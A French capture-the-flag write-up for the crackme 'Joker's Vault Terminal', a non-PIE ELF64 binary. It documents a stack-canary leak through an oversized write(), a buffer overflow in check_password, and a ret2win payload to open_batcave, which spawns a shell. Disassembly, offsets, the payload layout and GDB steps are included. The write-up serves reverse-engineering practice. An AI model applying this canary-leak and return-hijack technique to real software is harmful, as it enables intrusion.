# 23x41's 0x8A7 — Joker's Vault Terminal

> **Origine** : [`ORIGIN.yml`](ORIGIN.yml) · [crackmes.one](https://crackmes.one/crackme/6a597d5e055757d3df60fd58) · id `6a597d5e055757d3df60fd58`

Crackme **ELF64 x86-64**, C, non strippé (+ `debug_info`), **non-PIE** (`EXEC`), **canary présent** (`-fstack-protector-all`). Leak du canary via un `write()` « debug », puis overflow dans `check_password` → **ret2win** sur `open_batcave`.
Auteur : [23x41](https://crackmes.one/user/23x41). 5ᵉ épisode de la série **0x8A7** après [Secure Vault](../6a59d79ba27dfa335e4c8597/), [DPRK Loyalty Evaluation](../6a5995410b25d281a656896f/), [Maze](../6a597d7f0691b3daf2a3f2a0/) et [Batcave](../6a597d2a0b25d281a656896b/).

Dossier : `authors/23x41/6a597d5e055757d3df60fd58/` — [famille](../README.md) · [repo](../../../README.md).

| Fichier | Rôle |
|---|---|
| [`joker_vault`](original/joker_vault) | binaire d'origine |
| [`README.md`](README.md) | ce write-up |
| [`jokervault-solve.py`](tools/jokervault-solve.py) | leak canary + ret2win |

## Réponse

| | |
|---|---|
| **Flag** | `FLAG{0x8A7_C4N4RY_L34K_4ND_R3US3}` |
| Mot de passe (leurre) | `H4H4H4_G0TCH4` — `strncmp` OK **mais** jamais relié à `open_batcave` |
| Nom d'exemple | **`petik`** (demandé par `riddle_leak`, sans contrainte particulière) |

```bash
python3 tools/jokervault-solve.py -q
python3 tools/jokervault-solve.py --name petik --check
```

---

## 1. Premier regard

```text
file original/joker_vault
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

sha256: 899a3ab71318d59e22056f5c5a5ca66964a37bfc41658f1e320ad6df4f4d94e4
```

| Protection | État |
|---|---|
| PIE | **non** (`ET_EXEC`, adresses fixes `0x40….`) |
| Canary | **oui** (`-fstack-protector-all` dans les strings du compilateur, `__stack_chk_fail` présent) |
| NX | n/a — pas de shellcode, `open_batcave` existe déjà dans le binaire |

| Symbole | Adresse |
|---|---|
| `open_batcave` | `0x4011a6` |
| `riddle_leak` | `0x40121f` |
| `check_password` | `0x4012cc` |
| `main` | `0x401394` |

Même famille que [Batcave](../6a597d2a0b25d281a656896b/), mais cette fois le binaire ajoute une étape `riddle_leak` et un canary : le ret2win direct ne suffit plus, il faut d'abord **récupérer** le canary.

---

## 2. Flow

```text
main
  banner Wayne Enterprises
  riddle_leak()
  check_password()
  "[LOG] Session ended."

riddle_leak
  printf("what's your name? ")
  read(0, buf, 0x20)           ; buf @ rbp-0x30, canary @ rbp-0x8
  printf("Oh, '")
  write(1, buf, 0x38)          ; leak 0x38 (56) octets : buffer entier + canary
  puts("'... how quaint.")

check_password
  printf("Enter the Vault access code: ")
  read(0, buf2, 0x2bc)         ; buf2 @ rbp-0x50, canary @ rbp-0x8 — overflow massif
  strncmp(buf2, "H4H4H4_G0TCH4", 13)
    OK  → "Correct code -- but that's not how you'll get in tonight."
    KO  → "Access Denied. Try again, Bat-Brain."
  ; jamais open_batcave, même en cas de succès

open_batcave
  BATCOMPUTER / victory
  puts(FLAG)
  system("/bin/sh")
```

---

## 3. Comment on trouve le leak + ret2win

### Ancrage

`objdump -d -M intel original/joker_vault` sur `riddle_leak` (`0x40121f`) :

```asm
401259: lea    rax,[rbp-0x30]
40125d: mov    edx,0x20
401262: mov    rsi,rax
401265: mov    edi,0x0
40126a: call   401090 <read@plt>     ; read(0, buf, 0x20) -- buf @ rbp-0x30

40128e: lea    rax,[rbp-0x30]
401292: mov    edx,0x38
401297: mov    rsi,rax
40129a: mov    edi,0x1
40129f: call   401050 <write@plt>    ; write(1, buf, 0x38) -- leak au-delà du buffer !
```

Le canary est chargé en tête de fonction :

```asm
401227: mov    rax,QWORD PTR fs:0x28     ; canary (TLS)
401230: mov    QWORD PTR [rbp-0x8],rax   ; stocké @ rbp-0x8
```

`buf` est à `rbp-0x30`, le canary à `rbp-0x8` : offset depuis `buf` = `0x30 - 0x8 = 0x28`. Le `write(1, buf, 0x38)` envoie 56 octets, donc les octets `[0x28:0x30]` de ce qui est renvoyé sont **exactement** le canary.

### Décodage du leak

```bash
$ printf 'petik\n' | ./original/joker_vault | xxd
# "...Oh, 'petik\n\x00\x00<8 octets pointeur><8 octets pointeur>\x00\x00\x00\x3e\x5a\x41\xdf\xe5\x4c\xf6'... how quaint."
```

Les octets `[0x28:0x30]` du buffer leaké commencent systématiquement par `0x00` — signature classique d'un stack canary (son octet bas est forcé à zéro pour stopper les leaks via `printf("%s")`). On extrait ces 8 octets et on les réinterprète en little-endian (`struct.unpack("<Q", ...)`).

**Piège** : ce même canary est **réutilisé** dans `check_password`, puisque les deux fonctions sont dans le même thread / même frame TLS (`fs:0x28`). Un leak dans `riddle_leak` suffit donc à casser la protection de `check_password`.

### Overflow (`check_password`)

```asm
401306: lea    rax,[rbp-0x50]
40130a: mov    edx,0x2bc
40130f: mov    rsi,rax
401312: mov    edi,0x0
401317: call   401090 <read@plt>    ; read(0, buf2, 0x2bc) -- buf2 @ rbp-0x50
```

| Offset depuis `buf2` (`rbp-0x50`) | Contenu |
|---|---|
| `0x00…0x47` | buffer (notre payload) |
| `0x48` | **canary** (à reproduire, sinon `__stack_chk_fail` tue le process avant le `ret`) |
| `0x50` | saved `rbp` |
| `0x58` | **adresse de retour** → `open_batcave` (`0x4011a6`, pas de PIE) |

### Assemblage de la réponse

```python
payload  = b"A" * 0x48            # padding jusqu'au canary
payload += p64(canary)            # canary leaké, reproduit à l'identique
payload += b"B" * 8               # saved rbp, peu importe
payload += p64(0x4011a6)          # ret -> open_batcave
```

Pipeline complet : envoyer `petik\n` au premier prompt → parser le leak entre `"Oh, '"` et `"'... how quaint."` → extraire les octets `[0x28:0x30]` → construire le payload ci-dessus → l'envoyer au second prompt. Le flag sort malgré l'`"Access Denied"` affiché juste avant (le `strncmp` échoue, mais `check_password` exécute quand même son `ret` détourné vers `open_batcave`).

---

## Debug GDB (pas à pas)

ELF **non-PIE**, **canary présent**, non strippé (+ `debug_info`).

### 4.1 Cartographie

```bash
gdb -q original/joker_vault
(gdb) info address riddle_leak      # 0x40121f
(gdb) info address check_password   # 0x4012cc
(gdb) info address open_batcave     # 0x4011a6
(gdb) disassemble riddle_leak
```

Confirme `mov rax, fs:0x28` (canary) en tête de `riddle_leak`, le `read(0, rbp-0x30, 0x20)` et le `write(1, rbp-0x30, 0x38)` juste après.

### 4.2 Observer le canary en mémoire

```bash
gdb -q original/joker_vault
(gdb) break *0x401259         ; juste avant le read() de riddle_leak
(gdb) run
(gdb) continue                ; laisser lire le nom
(gdb) x/1gx $rbp-0x8          ; valeur du canary pour cette exécution
```

Le canary change à chaque run (dérivé de `/dev/urandom` au chargement de l'ELF) : c'est pour ça que le leak **doit** être fait à chaque exécution, jamais codé en dur dans le solveur — vérifié en relançant `tools/jokervault-solve.py` plusieurs fois (canary différent chaque fois, flag toujours obtenu).

### 4.3 Vérifier le ret2win après reproduction du canary

```bash
(gdb) break check_password
(gdb) continue
(gdb) break open_batcave
(gdb) continue              ; en lui donnant le payload avec le bon canary en stdin
(gdb) info frame
```

`open_batcave` est atteint par le `ret` de `check_password`, sans jamais passer par un `call` direct — exactement comme pour [Batcave](../6a597d2a0b25d281a656896b/), mais seulement si le canary écrasé correspond à l'original (sinon `__stack_chk_fail` est appelé avant d'atteindre le `ret`, et le process meurt sur `*** stack smashing detected ***`).

---

## 5. Vérification

```bash
$ python3 tools/jokervault-solve.py --check
[+] canary leaké : 0x214c3b0e1bfa2f00
CHECK: OK
```

Sortie complète (cas OK) :

```text
Enter the Vault access code: Access Denied. Try again, Bat-Brain.

[BATCOMPUTER]: Access Granted. The Batcave doors slide open...
The Joker never saw this coming.
FLAG{0x8A7_C4N4RY_L34K_4ND_R3US3}
```

Cas KO / edge — canary **faux** (ex. mis à `0`) : `__stack_chk_fail` se déclenche avant le `ret`, le process se termine par `*** stack smashing detected ***` et le flag n'apparaît jamais. De même, envoyer directement le vrai mot de passe `H4H4H4_G0TCH4\n` (sans overflow) donne "Correct code -- but that's not how you'll get in tonight." suivi de "[LOG] Session ended." — jamais le flag.

---

## 6. Notes

- Le canary est bien **par-exécution** (pas une constante du binaire) : le solveur doit relire la sortie et extraire 8 octets à chaque run, jamais le hardcoder.
- Pas de PIE ⇒ `open_batcave` a une adresse fixe, connue statiquement (`0x4011a6`) : seul le canary est dynamique ici, contrairement à [Maze](../6a597d7f0691b3daf2a3f2a0/) qui est PIE et nécessite en plus un leak d'adresse de retour pour calculer la base.
- `H4H4H4_G0TCH4` est un leurre volontaire (le nom de la fonction du check s'appelle `check_password` mais ne relie jamais au `system("/bin/sh")` de `open_batcave`), même schéma que les autres épisodes de la série 0x8A7.
